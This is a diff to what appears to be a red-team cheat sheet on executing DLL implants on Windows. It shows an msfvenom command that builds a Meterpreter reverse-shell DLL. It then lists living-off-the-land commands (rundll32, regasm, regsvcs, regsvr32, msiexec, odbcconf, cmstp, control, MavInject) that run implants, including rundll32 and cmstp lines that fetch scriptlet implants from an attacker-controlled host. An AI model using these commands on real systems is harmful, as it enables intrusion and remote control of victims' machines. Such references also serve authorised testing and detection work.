@@ -1,6 +1,16 @@
+---
+author(s):
+  - Userware
+tags:
+  - initial-access
+  - weaponization
+  - client-side-attacks
+  - living-off-the-land
+  - T1085
+  - T1191
+  - windows
+---
 # DLL Execution
-
-Search Tag(s): #T1085 #T1191
 
 Generate a DLL implant.
 
@@ -8,7 +18,7 @@ Generate a DLL implant.
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f dll -o implant.dll
 ```
 
-## Rundll32
+## `rundll32.exe`
 
 ```
 C:\> rundll32.exe implant.dll,StartW
@@ -32,7 +42,7 @@ Execute a scriptlet implant from a web server.
 C:\> rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http[s]://<IP>[:PORT]/implant.sct")"
 ```
 
-## Regasm
+## `regasm.exe`
 
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe
@@ -50,13 +60,21 @@ Loads the target .DLL file and executes the UnRegisterClass function.
 C:\> regasm.exe /U AllTheThingsx64.dll
 ```
 
-## Regsvcs
+## `regsvcs.exe`
 
 ```
 C:\> regsvcs.exe AllTheThingsx64.dll
 ```
 
-## Msiexec
+## `regsvr32.exe`
+
+Execute DLL implant.
+
+```
+C:\> regsvr32.exe /s implant.dll
+```
+
+## `msiexec.exe`
 
 Execute the DLL implant  (calls `DLLRegisterServer`).
 
@@ -70,13 +88,13 @@ Unregisters the target DLL.
 C:\> msiexec.exe /z "C:\path\to\implant.dll"
 ```
 
-## odbcconf
+## `odbcconf.exe`
 
 ```
 C:\> odbcconf.exe /a {regsvr.exe C:\path\to\implant.dll}
 ```
 
-## CMSTP
+## `cmstp.exe`
 
 Fileless scriptlet implant template
 
@@ -129,13 +147,13 @@ Execute fileless implant.
 C:\> cmstp.exe /ni /s http[s]://<IP>[:PORT]/implant.inf
 ```
 
-## Control
+## `control.exe`
 
 ```
 C:\> control.exe .\reflective_implant_loader.dll
 ```
 
-## MavInject
+## `MavInject.exe`
 
 Inject DLL implant in a process ID.
 
